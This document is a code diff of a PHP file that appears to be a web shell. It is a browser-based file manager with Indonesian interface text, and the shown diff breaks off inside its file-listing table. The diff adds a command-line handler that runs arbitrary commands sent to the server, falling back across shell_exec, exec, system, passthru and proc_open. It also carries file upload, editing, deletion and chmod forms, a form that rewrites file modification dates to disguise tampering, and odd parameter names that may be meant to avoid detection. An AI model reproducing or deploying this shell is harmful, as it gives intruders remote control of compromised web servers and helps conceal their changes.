-                    $file = fopen($file_path, "w");
-                    if ($file) {
-                        fwrite($file, $file_content);
-                        fclose($file);
-                        echo ("<script>alert('File berhasil dibuat: " . addslashes($file_name) . "'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
-                    } else {
-                        echo ("<script>alert('Gagal membuat file.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
-                    }
-                } else {
-                    echo ("<script>alert('File dengan nama tersebut sudah ada!'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
-                }
-            } else {
-                echo ("<script>alert('Nama file tidak boleh kosong!'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
-            }
-        }
-    }
-
-    // Upload File Form
-    if (isset($_GET['upxc']) && isset($_GET['q'])) {
-        echo '
-        <div class="main-container">
-            <div class="upload-form">
-                <h5 style="color: #ffc107;"><i class="fa-solid fa-upload"></i> Upload File</h5>
-                <form method="post" enctype="multipart/form-data">
-                    <div class="row">
-                        <div class="col-md-6">
-                            <label for="bnexazabi">Select file:</label>
-                            <input type="file" class="form-control" name="bnexazabi" id="bnexazabi" required>
-                        </div>
-                        <div class="col-md-12 mt-3">
-                            <input type="submit" class="btn btn-primary" value="Upload File" name="upofile">
-                            <a href="?p=' . encodePath(PATH) . '" class="btn btn-secondary">Batal</a>
-                        </div>
-                    </div>
-                </form>
-            </div>
-        </div>';
-    }
-
-    // Rename Form
-    if (isset($_GET['r']) && isset($_GET['q'])) {
-        echo '
-        <div class="main-container">
-            <div class="rename-form">
-                <h5 style="color: #ffc107;"><i class="fa-sharp fa-regular fa-pen-to-square"></i> Rename: ' . htmlspecialchars($_GET['r']) . '</h5>
-                <form method="post">
-                    <div class="row">
-                        <div class="col-md-6">
-                            <label for="name">New name:</label>
-                            <input type="text" class="form-control" name="name" value="' . htmlspecialchars($_GET['r']) . '" required autofocus>
-                        </div>
-                        <div class="col-md-12 mt-3">
-                            <input type="submit" class="btn btn-primary" value="Rename" name="rename">
-                            <a href="?p=' . encodePath(PATH) . '" class="btn btn-secondary">Batal</a>
-                        </div>
-                    </div>
-                </form>
-            </div>
-        </div>';
-        
-        if (isset($_POST['rename'])) {
-            $name = PATH . "/" . $_GET['r'];
-            if (rename($name, PATH . "/" . $_POST['name'])) {
-                echo ("<script>alert('Renamed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
-            } else {
-                echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
-            }
-        }
-    }
-
-    // Handle date modification form
-    if (isset($_GET['t']) && isset($_GET['q'])) {
-        $item_name = $_GET['t'];
-        $item_path = PATH . "/" . $item_name;
-        $current_time = filemtime($item_path);
-        
-        echo '
-        <div class="main-container">
-            <div class="date-picker-form">
-                <h5 style="color: #ffc107;"><i class="fa-regular fa-calendar"></i> Ubah Tanggal Modified: ' . htmlspecialchars($item_name) . '</h5>
-                <div class="current-date">Current date: ' . date("F d Y H:i:s", $current_time) . '</div>
-                <form method="post">
-                    <div class="row">
-                        <div class="col-md-6">
-                            <label for="new_date">New date:</label>
-                            <input type="text" class="form-control" name="new_date" placeholder="Contoh: December 06 2025 19:21:40" value="' . date("F d Y H:i:s", $current_time) . '" required>
-                            <div class="date-example">Format: December 06 2025 19:21:40</div>
-                        </div>
-                        <div class="col-md-12 mt-3">
-                            <input type="submit" class="btn btn-primary" name="change_date" value="Ubah Tanggal">
-                            <a href="?p=' . encodePath(PATH) . '" class="btn btn-secondary">Batal</a>
-                        </div>
-                    </div>
-                </form>
-            </div>
-        </div>';
-        
-        if (isset($_POST['change_date'])) {
-            $new_date = strtotime($_POST['new_date']);
-            if ($new_date !== false && $new_date != -1) {
-                if (touch($item_path, $new_date)) {
-                    echo ("<script>alert('Tanggal modified berhasil diubah menjadi: " . date("F d Y H:i:s", $new_date) . "'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
-                } else {
-                    echo ("<script>alert('Gagal mengubah tanggal modified.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
-                }
-            } else {
-                echo ("<script>alert('Format tanggal tidak valid! Gunakan format seperti: December 06 2025 19:21:40'); window.location.replace('?p=" . encodePath(PATH) . "&t=" . urlencode($item_name) . "');</script>");
-            }
-        }
-    }
-
-    // Handle file edit mode with CodeMirror
-    if (isset($_GET['e']) && isset($_GET['q']) && !isset($_GET['p'])) {
-        $edit_file = $_GET['e'];
-        $edit_path = PATH . "/" . $edit_file;
-        $ext = strtolower(fileExtension($edit_file));
-        $mode = getCodeMirrorMode($ext);
-        $file_content = htmlspecialchars(file_get_contents($edit_path), ENT_QUOTES, 'UTF-8');
-        
-        if (is_file($edit_path)) {
-            echo '
-            <div class="main-container">
-                <div class="edit-mode">
-                    <div class="edit-header">
-                        <h3><i class="fa-solid fa-file-pen"></i> Editing: ' . htmlspecialchars($edit_file) . '</h3>
-                    </div>
-                    
-                    <form method="post" id="editorForm">
-                        <div class="code-editor-container">
-                            <textarea id="codeEditor" name="data" style="display: none;">' . $file_content . '</textarea>
-                            <div id="codemirror-editor"></div>
-                        </div>
-                        
-                        <div class="editor-info">
-                            <span><i class="fa-solid fa-code"></i> Mode: <span class="editor-language">' . strtoupper($ext) . '</span></span>
-                            <span><i class="fa-regular fa-keyboard"></i> Line: <span id="lineCount">0</span> | Column: <span id="colCount">0</span></span>
-                        </div>
-                        
-                        <div class="edit-footer">
-                            <button type="submit" class="btn btn-success" name="edit" id="saveButton"><i class="fa-solid fa-floppy-disk"></i> Simpan Perubahan</button>
-                            <a href="?p=' . encodePath(PATH) . '" class="btn btn-secondary"><i class="fa-solid fa-times"></i> Batal</a>
-                        </div>
-                    </form>
+            <div class="chmod-preview">
+                <div style="display: flex; align-items: center; flex-wrap: wrap; gap: 15px;">
+                    <span class="current-perms-badge">Current: ' . $current_perms . '</span>
+                    <span style="color: #adb5bd;">' . (is_writable($item_path) ? '<i class="fa-solid fa-check" style="color: #4caf50;"></i> Writable' : '<i class="fa-solid fa-lock" style="color: #f44336;"></i> Read Only') . '</span>
                 </div>
             </div>
             
-            <script>
-                // Initialize CodeMirror
-                var editor = CodeMirror(document.getElementById("codemirror-editor"), {
-                    value: ' . json_encode(file_get_contents($edit_path)) . ',
-                    mode: "' . $mode . '",
-                    theme: "dracula",
-                    lineNumbers: true,
-                    lineWrapping: true,
-                    indentUnit: 4,
-                    tabSize: 4,
-                    indentWithTabs: true,
-                    matchBrackets: true,
-                    autoCloseBrackets: true,
-                    styleActiveLine: true,
-                    extraKeys: {
-                        "Tab": function(cm) {
-                            cm.replaceSelection("    ", "end");
-                        },
-                        "Ctrl-S": function(cm) {
-                            document.getElementById("saveButton").click();
-                        }
-                    }
-                });
+            <form method="post" id="chmodForm">
+                <div class="row">
+                    <div class="col-md-12">
+                        <label for="permissions">Permissions (Octal):</label>
+                        <div class="input-group mb-3">
+                            <span class="input-group-text" style="background-color: #3d3d3d; color: #ffc107; border: 1px solid #007bff;">0</span>
+                            <input type="text" class="form-control" id="permissions" name="permissions" 
+                                   value="' . substr($current_perms, 1) . '" 
+                                   placeholder="755" maxlength="3" 
+                                   style="font-family: monospace; max-width: 100px;" 
+                                   pattern="[0-7]{3}" title="Masukkan 3 digit angka octal (0-7)" required>
+                            <span class="input-group-text" style="background-color: #3d3d3d; color: #ffffff; border: 1px solid #007bff;">
+                                Contoh: 755, 644, 777
+                            </span>
+                        </div>
+                    </div>
+                </div>
                 
-                // Update cursor position
-                editor.on("cursorActivity", function() {
-                    var pos = editor.getCursor();
-                    document.getElementById("lineCount").textContent = pos.line + 1;
-                    document.getElementById("colCount").textContent = pos.ch + 1;
-                });
-                
-                // Set initial cursor position
-                setTimeout(function() {
-                    var pos = editor.getCursor();
-                    document.getElementById("lineCount").textContent = pos.line + 1;
-                    document.getElementById("colCount").textContent = pos.ch + 1;
-                }, 100);
-                
-                // Update textarea before form submit
-                document.getElementById("editorForm").addEventListener("submit", function() {
-                    document.getElementById("codeEditor").value = editor.getValue();
-                });
-            </script>';
-            
-            if (isset($_POST['edit'])) {
-                $data = $_POST['data'];
-                $open = fopen($edit_path, "w");
-                if (fwrite($open, $data)) {
-                    echo ("<script>alert('File berhasil disimpan.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
-                } else {
-                    echo ("<script>alert('Gagal menyimpan file.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
-                }
-                fclose($open);
-            }
-        }
-    }
-
-    // Handle unzip - langsung ekstrak tanpa konfirmasi
-    if (isset($_GET['u']) && isset($_GET['q'])) {
-        $zip_file = $_GET['u'];
-        $zip_path = PATH . "/" . $zip_file;
-        $ext = strtolower(fileExtension($zip_file));
+                <div class="mt-3">
+                    <button type="submit" class="btn btn-warning" name="change_perms" style="background-color: #ffc107; color: #000; border-color: #b38f00;">
+                        <i class="fa-solid fa-key"></i> Change Permissions
+                    </button>
+                    <a href="?p=' . encodePath(PATH) . '" class="btn btn-secondary">
+                        <i class="fa-solid fa-times"></i> Cancel
+                    </a>
+                </div>
+            </form>
+        </div>
+    </div>';
+    
+    if (isset($_POST['change_perms'])) {
+        $new_perms = $_POST['permissions'];
         
-        if ($ext == 'zip') {
-            if (unzipFile($zip_path, PATH)) {
-                echo ("<script>alert('File berhasil diunzip di lokasi: " . addslashes(PATH) . "'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+        // Validasi input
+        if (preg_match('/^[0-7]{3}$/', $new_perms)) {
+            if (chmodPath($item_path, $new_perms)) {
+                echo ("<script>alert('Permissions berhasil diubah menjadi 0" . $new_perms . "'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
             } else {
-                echo ("<script>alert('Gagal mengunzip file. Pastikan file zip valid dan ekstensi ZipArchive tersedia.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+                echo ("<script>alert('Gagal mengubah permissions. Mungkin Anda tidak memiliki akses untuk mengubah permissions file/folder ini.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
             }
         } else {
-            echo ("<script>alert('File bukan file zip!'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+            echo ("<script>alert('Format permission tidak valid! Gunakan 3 digit angka octal (0-7). Contoh: 755, 644, 777'); window.location.replace('?p=" . encodePath(PATH) . "&chmod=" . urlencode($item_name) . "');</script>");
         }
     }
+}
 
-    // Handle upload file POST
-    if (isset($_POST["upofile"])) {
-        $target_file = PATH . "/" . $_FILES["bnexazabi"]["name"];
-        if (move_uploaded_file($_FILES["bnexazabi"]["tmp_name"], $target_file)) {
-            echo "<div class='main-container'><p style='color: #4caf50;'>" . htmlspecialchars(basename($_FILES["bnexazabi"]["name"])) . " has been uploaded.</p></div>";
-            echo ("<script>setTimeout(function() { window.location.replace('?p=" . encodePath(PATH) . "'); }, 2000);</script>");
+// Handle CMD
+if (isset($_GET['cmd']) && isset($_GET['q'])) {
+    $current_dir = PATH;
+    $output = '';
+    $command = '';
+    $return_var = 0;
+    
+    if (isset($_POST['execute_cmd'])) {
+        $command = $_POST['command'];
+        
+        $old_dir = getcwd();
+        
+        if (chdir($current_dir)) {
+            if (function_exists('shell_exec')) {
+                $output = shell_exec($command . " 2>&1");
+                $return_var = ($output === null) ? 1 : 0;
+            } elseif (function_exists('exec')) {
+                exec($command . " 2>&1", $output_array, $return_var);
+                $output = implode("\n", $output_array);
+            } elseif (function_exists('system')) {
+                ob_start();
+                system($command . " 2>&1", $return_var);
+                $output = ob_get_clean();
+            } elseif (function_exists('passthru')) {
+                ob_start();
+                passthru($command . " 2>&1", $return_var);
+                $output = ob_get_clean();
+            } elseif (function_exists('proc_open')) {
+                $descriptorspec = [
+                    0 => ["pipe", "r"],
+                    1 => ["pipe", "w"],
+                    2 => ["pipe", "w"]
+                ];
+                
+                $process = proc_open($command, $descriptorspec, $pipes, $current_dir, null);
+                
+                if (is_resource($process)) {
+                    $output = stream_get_contents($pipes[1]);
+                    $error = stream_get_contents($pipes[2]);
+                    fclose($pipes[0]);
+                    fclose($pipes[1]);
+                    fclose($pipes[2]);
+                    $return_var = proc_close($process);
+                    
+                    if (!empty($error)) {
+                        $output = $error;
+                    }
+                } else {
+                    $output = "Error: Failed to open process";
+                    $return_var = 1;
+                }
+            } else {
+                $output = "ERROR: Semua fungsi command execution dinonaktifkan oleh server!";
+                $return_var = 1;
+            }
+            
+            chdir($old_dir);
         } else {
-            echo "<div class='main-container'><p style='color: #f44336;'>Sorry, there was an error uploading your file.</p></div>";
+            $output = "Error: Tidak dapat mengakses direktori " . $current_dir;
+            $return_var = 1;
+        }
+        
+        if (empty(trim($output))) {
+            $output = "Command executed successfully";
         }
     }
+    
+    echo '
+    <div class="main-container">
+        <div class="cmd-form">
+            <h5 style="color: #ffc107;"><i class="fa-solid fa-terminal"></i> Command Line</h5>
+            
+            <form method="post">
+                <div class="row">
+                    <div class="col-md-10">
+                        <div class="input-group mb-3">
+                            <span class="input-group-text" style="background-color: #3d3d3d; color: #ffc107; border: 1px solid #007bff; font-weight: bold;">$</span>
+                            <input type="text" class="form-control" name="command" placeholder="ls -la" value="' . htmlspecialchars($command) . '" required autofocus style="font-family: monospace; max-width: 300px;">
+                            <button type="submit" class="btn btn-cmd" name="execute_cmd"><i class="fa-solid fa-play"></i> Execute</button>
+                            <a href="?p=' . encodePath(PATH) . '" class="btn btn-secondary"><i class="fa-solid fa-times"></i> Close</a>
+                        </div>
+                    </div>
+                </div>
+            </form>';
+    
+    if (!empty($command)) {
+        echo '<div class="terminal-output" style="border-color: #ffc107;">';
+        echo '<div style="border-bottom: 1px solid #007bff; padding-bottom: 8px; margin-bottom: 8px;">';
+        echo '<span style="color: #ffc107;">$</span> <span style="color: #ffffff;">' . htmlspecialchars($command) . '</span>';
+        echo '</div>';
+        echo '<pre style="margin: 0; color: #ffffff; font-family: monospace;">' . htmlspecialchars($output) . '</pre>';
+        echo '</div>';
+    }
+    
+    echo '</div></div>';
+}
 
-    // Handle delete dengan fungsi rekursif untuk folder
-    if (isset($_GET['d']) && isset($_GET['q'])) {
-        $name = PATH . "/" . $_GET['d'];
-        if (is_file($name)) {
-            if (unlink($name)) {
-                echo ("<script>alert('File removed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+// Handle Create Folder Form
+if (isset($_GET['createfolder']) && isset($_GET['q'])) {
+    echo '
+    <div class="main-container">
+        <div class="create-folder-form">
+            <h5 style="color: #ffc107;"><i class="fa-regular fa-folder"></i> Create New Folder</h5>
+            <form method="post">
+                <div class="row">
+                    <div class="col-md-6">
+                        <label for="folder_name">Folder name:</label>
+                        <input type="text" class="form-control" name="folder_name" placeholder="Enter folder name" required autofocus>
+                    </div>
+                    <div class="col-md-12 mt-3">
+                        <input type="submit" class="btn btn-success" name="create_folder" value="Create Folder">
+                        <a href="?p=' . encodePath(PATH) . '" class="btn btn-secondary">Batal</a>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>';
+    
+    if (isset($_POST['create_folder'])) {
+        $folder_name = $_POST['folder_name'];
+        $folder_path = PATH . "/" . $folder_name;
+        
+        if (!empty($folder_name)) {
+            if (!file_exists($folder_path)) {
+                if (mkdir($folder_path, 0755)) {
+                    echo ("<script>alert('Folder berhasil dibuat: " . addslashes($folder_name) . "'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+                } else {
+                    echo ("<script>alert('Gagal membuat folder.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+                }
             } else {
-                echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+                echo ("<script>alert('Folder dengan nama tersebut sudah ada!'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
             }
-        } elseif (is_dir($name)) {
-            if (deleteDirectory($name)) {
-                echo ("<script>alert('Folder beserta semua isinya berhasil dihapus.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
-            } else {
-                echo ("<script>alert('Gagal menghapus folder.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
-            }
+        } else {
+            echo ("<script>alert('Nama folder tidak boleh kosong!'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
         }
     }
+}
 
-    // Tampilkan tabel file hanya jika tidak ada form action yang aktif
-    if (isset($_GET['p']) && !isset($_GET['createfolder']) && !isset($_GET['createfile']) && !isset($_GET['upxc']) && !isset($_GET['r']) && !isset($_GET['t']) && !isset($_GET['e']) && !isset($_GET['cmd'])) {
-        echo '<div class="main-container">';
-
-        //fetch files
-        if (is_readable(PATH)) {
-            $fetch_obj = scandir(PATH);
-            $folders = array();
-            $files = array();
-            foreach ($fetch_obj as $obj) {
-                if ($obj == '.' || $obj == '..') {
-                    continue;
+// Handle Create File Form
+if (isset($_GET['createfile']) && isset($_GET['q'])) {
+    echo '
+    <div class="main-container">
+        <div class="create-file-form">
+            <h5 style="color: #ffc107;"><i class="fa-regular fa-file"></i> Create New File</h5>
+            <form method="post">
+                <div class="row">
+                    <div class="col-md-6">
+                        <label for="file_name">File name:</label>
+                        <input type="text" class="form-control" name="file_name" placeholder="Contoh: index.php, style.css, readme.txt" required autofocus>
+                        <div class="date-example">Gunakan ekstensi file yang sesuai</div>
+                    </div>
+                    <div class="col-md-12 mt-3">
+                        <label for="file_content">File content:</label>
+                        <textarea class="form-control" name="file_content" rows="5" placeholder="Isi file"></textarea>
+                    </div>
+                    <div class="col-md-12 mt-3">
+                        <input type="submit" class="btn btn-info" name="create_file" value="Create File">
+                        <a href="?p=' . encodePath(PATH) . '" class="btn btn-secondary">Batal</a>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>';
+    
+    if (isset($_POST['create_file'])) {
+        $file_name = $_POST['file_name'];
+        $file_content = $_POST['file_content'];
+        $file_path = PATH . "/" . $file_name;
+        
+        if (!empty($file_name)) {
+            if (!file_exists($file_path)) {
+                $file = fopen($file_path, "w");
+                if ($file) {
+                    fwrite($file, $file_content);
+                    fclose($file);
+                    echo ("<script>alert('File berhasil dibuat: " . addslashes($file_name) . "'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+                } else {
+                    echo ("<script>alert('Gagal membuat file.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                 }
-                $new_obj = PATH . '/' . $obj;
-                if (is_dir($new_obj)) {
-                    array_push($folders, $obj);
-                } elseif (is_file($new_obj)) {
-                    array_push($files, $obj);
-                }
+            } else {
+                echo ("<script>alert('File dengan nama tersebut sudah ada!'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
             }
+        } else {
+            echo ("<script>alert('Nama file tidak boleh kosong!'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
         }
+    }
+}
+
+// Handle Upload File Form
+if (isset($_GET['upxc']) && isset($_GET['q'])) {
+    echo '
+    <div class="main-container">
+        <div class="upload-form">
+            <h5 style="color: #ffc107;"><i class="fa-solid fa-upload"></i> Upload File</h5>
+            <form method="post" enctype="multipart/form-data">
+                <div class="row">
+                    <div class="col-md-6">
+                        <label for="bnexazabi">Select file:</label>
+                        <input type="file" class="form-control" name="bnexazabi" id="bnexazabi" required>
+                    </div>
+                    <div class="col-md-12 mt-3">
+                        <input type="submit" class="btn btn-primary" value="Upload File" name="upofile">
+                        <a href="?p=' . encodePath(PATH) . '" class="btn btn-secondary">Batal</a>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>';
+}
+
+// Handle Rename Form
+if (isset($_GET['r']) && isset($_GET['q'])) {
+    echo '
+    <div class="main-container">
+        <div class="rename-form">
+            <h5 style="color: #ffc107;"><i class="fa-sharp fa-regular fa-pen-to-square"></i> Rename: ' . htmlspecialchars($_GET['r']) . '</h5>
+            <form method="post">
+                <div class="row">
+                    <div class="col-md-6">
+                        <label for="name">New name:</label>
+                        <input type="text" class="form-control" name="name" value="' . htmlspecialchars($_GET['r']) . '" required autofocus>
+                    </div>
+                    <div class="col-md-12 mt-3">
+                        <input type="submit" class="btn btn-primary" value="Rename" name="rename">
+                        <a href="?p=' . encodePath(PATH) . '" class="btn btn-secondary">Batal</a>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>';
+    
+    if (isset($_POST['rename'])) {
+        $name = PATH . "/" . $_GET['r'];
+        if (rename($name, PATH . "/" . $_POST['name'])) {
+            echo ("<script>alert('Renamed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+        } else {
+            echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+        }
+    }
+}
+
+// Handle date modification form
+if (isset($_GET['t']) && isset($_GET['q'])) {
+    $item_name = $_GET['t'];
+    $item_path = PATH . "/" . $item_name;
+    $current_time = filemtime($item_path);
+    
+    echo '
+    <div class="main-container">
+        <div class="date-picker-form">
+            <h5 style="color: #ffc107;"><i class="fa-regular fa-calendar"></i> Ubah Tanggal Modified: ' . htmlspecialchars($item_name) . '</h5>
+            <div class="current-date">Current date: ' . date("F d Y H:i:s", $current_time) . '</div>
+            <form method="post">
+                <div class="row">
+                    <div class="col-md-6">
+                        <label for="new_date">New date:</label>
+                        <input type="text" class="form-control" name="new_date" placeholder="Contoh: December 06 2025 19:21:40" value="' . date("F d Y H:i:s", $current_time) . '" required>
+                        <div class="date-example">Format: December 06 2025 19:21:40</div>
+                    </div>
+                    <div class="col-md-12 mt-3">
+                        <input type="submit" class="btn btn-primary" name="change_date" value="Ubah Tanggal">
+                        <a href="?p=' . encodePath(PATH) . '" class="btn btn-secondary">Batal</a>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>';
+    
+    if (isset($_POST['change_date'])) {
+        $new_date = strtotime($_POST['new_date']);
+        if ($new_date !== false && $new_date != -1) {
+            if (touch($item_path, $new_date)) {
+                echo ("<script>alert('Tanggal modified berhasil diubah menjadi: " . date("F d Y H:i:s", $new_date) . "'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+            } else {
+                echo ("<script>alert('Gagal mengubah tanggal modified.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+            }
+        } else {
+            echo ("<script>alert('Format tanggal tidak valid! Gunakan format seperti: December 06 2025 19:21:40'); window.location.replace('?p=" . encodePath(PATH) . "&t=" . urlencode($item_name) . "');</script>");
+        }
+    }
+}
+
+// Handle file edit mode with CodeMirror
+if (isset($_GET['e']) && isset($_GET['q']) && !isset($_GET['p'])) {
+    $edit_file = $_GET['e'];
+    $edit_path = PATH . "/" . $edit_file;
+    $ext = strtolower(fileExtension($edit_file));
+    $mode = getCodeMirrorMode($ext);
+    $file_content = htmlspecialchars(file_get_contents($edit_path), ENT_QUOTES, 'UTF-8');
+    
+    if (is_file($edit_path)) {
         echo '
+        <div class="main-container">
+            <div class="edit-mode">
+                <div class="edit-header">
+                    <h3><i class="fa-solid fa-file-pen"></i> Editing: ' . htmlspecialchars($edit_file) . '</h3>
+                </div>
+                
+                <form method="post" id="editorForm">
+                    <div class="code-editor-container">
+                        <textarea id="codeEditor" name="data" style="display: none;">' . $file_content . '</textarea>
+                        <div id="codemirror-editor"></div>
+                    </div>
+                    
+                    <div class="editor-info">
+                        <span><i class="fa-solid fa-code"></i> Mode: <span class="editor-language">' . strtoupper($ext) . '</span></span>
+                        <span><i class="fa-regular fa-keyboard"></i> Line: <span id="lineCount">0</span> | Column: <span id="colCount">0</span></span>
+                    </div>
+                    
+                    <div class="edit-footer">
+                        <button type="submit" class="btn btn-success" name="edit" id="saveButton"><i class="fa-solid fa-floppy-disk"></i> Simpan Perubahan</button>
+                        <a href="?p=' . encodePath(PATH) . '" class="btn btn-secondary"><i class="fa-solid fa-times"></i> Batal</a>
+                    </div>
+                </form>
+            </div>
+        </div>
+        
+        <script>
+            var editor = CodeMirror(document.getElementById("codemirror-editor"), {
+                value: ' . json_encode(file_get_contents($edit_path)) . ',
+                mode: "' . $mode . '",
+                theme: "dracula",
+                lineNumbers: true,
+                lineWrapping: true,
+                indentUnit: 4,
+                tabSize: 4,
+                indentWithTabs: true,
+                matchBrackets: true,
+                autoCloseBrackets: true,
+                styleActiveLine: true,
+                extraKeys: {
+                    "Tab": function(cm) {
+                        cm.replaceSelection("    ", "end");
+                    },
+                    "Ctrl-S": function(cm) {
+                        document.getElementById("saveButton").click();
+                    }
+                }
+            });
+            
+            editor.on("cursorActivity", function() {
+                var pos = editor.getCursor();
+                document.getElementById("lineCount").textContent = pos.line + 1;
+                document.getElementById("colCount").textContent = pos.ch + 1;
+            });
+            
+            setTimeout(function() {
+                var pos = editor.getCursor();
+                document.getElementById("lineCount").textContent = pos.line + 1;
+                document.getElementById("colCount").textContent = pos.ch + 1;
+            }, 100);
+            
+            document.getElementById("editorForm").addEventListener("submit", function() {
+                document.getElementById("codeEditor").value = editor.getValue();
+            });
+        </script>';
+        
+        if (isset($_POST['edit'])) {
+            $data = $_POST['data'];
+            $open = fopen($edit_path, "w");
+            if (fwrite($open, $data)) {
+                echo ("<script>alert('File berhasil disimpan.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+            } else {
+                echo ("<script>alert('Gagal menyimpan file.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+            }
+            fclose($open);
+        }
+    }
+}
+
+// Handle unzip
+if (isset($_GET['u']) && isset($_GET['q'])) {
+    $zip_file = $_GET['u'];
+    $zip_path = PATH . "/" . $zip_file;
+    $ext = strtolower(fileExtension($zip_file));
+    
+    if ($ext == 'zip') {
+        if (unzipFile($zip_path, PATH)) {
+            echo ("<script>alert('File berhasil diunzip di lokasi: " . addslashes(PATH) . "'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+        } else {
+            echo ("<script>alert('Gagal mengunzip file. Pastikan file zip valid dan ekstensi ZipArchive tersedia.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+        }
+    } else {
+        echo ("<script>alert('File bukan file zip!'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+    }
+}
+
+// Handle upload file POST
+if (isset($_POST["upofile"])) {
+    $target_file = PATH . "/" . $_FILES["bnexazabi"]["name"];
+    if (move_uploaded_file($_FILES["bnexazabi"]["tmp_name"], $target_file)) {
+        echo "<div class='main-container'><p style='color: #4caf50;'>" . htmlspecialchars(basename($_FILES["bnexazabi"]["name"])) . " has been uploaded.</p></div>";
+        echo ("<script>setTimeout(function() { window.location.replace('?p=" . encodePath(PATH) . "'); }, 2000);</script>");
+    } else {
+        echo "<div class='main-container'><p style='color: #f44336;'>Sorry, there was an error uploading your file.</p></div>";
+    }
+}
+
+// Handle delete
+if (isset($_GET['d']) && isset($_GET['q'])) {
+    $name = PATH . "/" . $_GET['d'];
+    if (is_file($name)) {
+        if (unlink($name)) {
+            echo ("<script>alert('File removed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+        } else {
+            echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+        }
+    } elseif (is_dir($name)) {
+        if (deleteDirectory($name)) {
+            echo ("<script>alert('Folder beserta semua isinya berhasil dihapus.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+        } else {
+            echo ("<script>alert('Gagal menghapus folder.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
+        }
+    }
+}
+
+// Tampilkan tabel file hanya jika tidak ada form action yang aktif
+if (isset($_GET['p']) && !isset($_GET['createfolder']) && !isset($_GET['createfile']) && !isset($_GET['upxc']) && !isset($_GET['r']) && !isset($_GET['t']) && !isset($_GET['e']) && !isset($_GET['cmd']) && !isset($_GET['chmod'])) {
+    echo '<div class="main-container">';
+
+    if (is_readable(PATH)) {
+        $fetch_obj = scandir(PATH);
+        $folders = array();
+        $files = array();
+        foreach ($fetch_obj as $obj) {
+            if ($obj == '.' || $obj == '..') {
+                continue;
+            }
+            $new_obj = PATH . '/' . $obj;
+            if (is_dir($new_obj)) {
+                array_push($folders, $obj);
+            } elseif (is_file($new_obj)) {
+                array_push($files, $obj);
+            }
+        }
+    }
+    
+    echo '
 <table class="table table-hover">
   <thead>
     <tr>
@@ -1343,43 +1452,44 @@ color: #ffc107;
   </thead>
   <tbody>
 ';
-        foreach ($folders as $folder) {
-            $perms = "0" . substr(decoct(fileperms(PATH . "/" . $folder)), -3);
-            $color_class = getPermsColorClass($perms);
-            echo "    <tr>
+    // Tampilkan folders
+    foreach ($folders as $folder) {
+        $perms = "0" . substr(decoct(fileperms(PATH . "/" . $folder)), -3);
+        $color_class = getPermsColorClass($perms, PATH . "/" . $folder);
+        echo "    <tr>
       <td><i class='fa-solid fa-folder'></i> <a href='?p=" . urlencode(encodePath(PATH . "/" . $folder)) . "'>" . $folder . "</a></td>
       <td><b>---</b></td>
       <td>" . date("F d Y H:i:s", filemtime(PATH . "/" . $folder)) . "</td>
       <td><span class='{$color_class}'>" . $perms . "</span></td>
       <td>
-      <a title='Ubah Tanggal' href='?q=" . urlencode(encodePath(PATH)) . "&t=" . urlencode($folder) . "'><i class='fa-regular fa-calendar'></i></a>
-      <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . urlencode($folder) . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
-      <a title='Delete' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . urlencode($folder) . "' onclick='return confirm(\"Yakin ingin menghapus folder ini beserta semua isinya?\")'><i class='fa fa-trash' aria-hidden='true'></i></a>
+        <a title='Ubah Tanggal' href='?q=" . urlencode(encodePath(PATH)) . "&t=" . urlencode($folder) . "'><i class='fa-regular fa-calendar'></i></a>
+        <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . urlencode($folder) . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
+        <a title='Chmod' href='?q=" . urlencode(encodePath(PATH)) . "&chmod=" . urlencode($folder) . "'><i class='fa-solid fa-key'></i></a>
